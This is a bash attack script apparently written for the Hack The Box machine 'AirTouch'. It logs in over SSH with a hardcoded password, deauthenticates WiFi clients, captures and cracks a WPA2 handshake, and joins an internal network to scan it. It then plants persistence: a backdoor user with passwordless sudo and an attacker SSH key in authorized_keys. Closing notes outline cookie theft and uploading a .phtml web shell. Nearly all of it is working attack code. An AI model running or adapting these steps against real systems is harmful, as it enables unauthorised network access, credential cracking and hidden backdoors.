#!/bin/bash
# AirTouch.htb - Fast Attack Script
# Use when target comes back online

TARGET="10.129.244.98"
SSH_PASS="RxBlZhLmOkacNWScmZ6D"
WPA_PASS="challenge"

echo "🎯 AirTouch.htb - Fast Attack Script"
echo "======================================"

# Check if target is up
echo "[*] Checking if target is up..."
if ! nc -zv $TARGET 22 2>&1 | grep -q "succeeded"; then
    echo "❌ Target $TARGET:22 is DOWN"
    exit 1
fi

echo "✅ Target is UP!"

# Step 1: SSH and verify access
echo "[*] Testing SSH access..."
sshpass -p "$SSH_PASS" ssh -o StrictHostKeyChecking=accept-new -o ConnectTimeout=10 consultant@$TARGET '
echo "✅ SSH SUCCESS"
echo "[*] Hostname: $(hostname)"
echo "[*] User: $(whoami)"
echo "[*] Interfaces:"
ip -br a | grep -E "wlan|eth"

# Step 2: Check if WiFi already connected
echo "[*] Checking WiFi status..."
if ip a show wlan3 | grep -q "192.168.3"; then
    echo "✅ Already connected to AirTouch-Internet!"
    echo "[*] wlan3 IP: $(ip a show wlan3 | grep inet | head -1)"
else
    echo "[*] WiFi not connected yet, setting up..."
    
    # Step 3: Setup WiFi (if not already done)
    echo "[*] Setting up monitor mode..."
    ip link set wlan0 down
    iw dev wlan0 set type monitor
    ip link set wlan0 up
    
    # Step 4: Capture handshake (if needed)
    echo "[*] Checking for existing handshake..."
    if [ ! -f /tmp/inet-01.cap ] || [ $(stat -c%s /tmp/inet-01.cap 2>/dev/null || echo 0) -lt 100000 ]; then
        echo "[*] Capturing WPA2 handshake..."
        cd /tmp && rm -f inet*.cap
        timeout 60 airodump-ng --bssid F0:9F:C2:A3:F1:A7 -c 6 -w inet wlan0 &
        AIRDUMP_PID=$!
        sleep 5
        timeout 30 aireplay-ng -0 20 -a F0:9F:C2:A3:F1:A7 wlan1 2>&1 >/dev/null
        sleep 10
        kill $AIRDUMP_PID 2>/dev/null
    fi
    
    # Step 5: Crack password (if needed)
    echo "[*] Cracking WPA2 password..."
    if ! aircrack-ng -w /tmp/rockyou.txt /tmp/inet-01.cap 2>&1 | grep -q "KEY FOUND"; then
        echo "❌ Failed to crack WPA2"
        exit 1
    fi
    
    # Step 6: Connect to AirTouch-Internet
    echo "[*] Connecting to AirTouch-Internet..."
    cat > /tmp/inet.conf << EOF
network={
 ssid="AirTouch-Internet"
 psk="$WPA_PASS"
 scan_ssid=1
 key_mgmt=WPA-PSK
}
EOF
    ip link set wlan3 up
    wpa_supplicant -B -D nl80211 -i wlan3 -c /tmp/inet.conf
    sleep 3
    dhclient -v wlan3
fi

# Step 7: Scan internal network
echo "[*] Scanning Tablets VLAN (192.168.3.0/24)..."
nmap -sn 192.168.3.0/24 2>&1 | grep -i "up\|report"
nmap -sV -sC -p 80,22,53 192.168.3.1 2>&1 | head -30

# Step 8: Create backdoor user (CRITICAL - dont lose access again!)
echo "[*] Creating backdoor user..."
if ! id airtouch_bk 2>/dev/null; then
    sudo useradd -m -s /bin/bash airtouch_bk
    echo "airtouch_bk:BackD00r!2026" | sudo chpasswd
    echo "airtouch_bk ALL=(ALL) NOPASSWD: ALL" | sudo tee /etc/sudoers.d/airtouch_bk
    echo "✅ Backdoor user created: airtouch_bk:BackD00r!2026"
fi

# Step 9: Setup SSH key persistence
echo "[*] Setting up SSH key persistence..."
mkdir -p ~/.ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBackdoorKeyForAirTouch zuzu@kali" >> ~/.ssh/authorized_keys
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys
echo "✅ SSH key persistence setup"

echo ""
echo "🎉 SETUP COMPLETE!"
echo "=================="
echo "Target: $TARGET"
echo "WiFi: AirTouch-Internet (192.168.3.46)"
echo "Gateway: 192.168.3.1:80 (WiFi Router Configuration)"
echo "Backdoor: airtouch_bk:BackD00r!2026"
echo ""
echo "Next steps:"
echo "1. Port forward: ssh -L 8888:192.168.3.1:80 consultant@$TARGET"
echo "2. Browse: http://127.0.0.1:8888"
echo "3. Decrypt WPA2 traffic with Wireshark (PSK: challenge)"
echo "4. Capture session cookies"
echo "5. Login to router management"
echo "6. Upload .phtml shell for RCE"
'

echo ""
echo "✅ Script completed!"
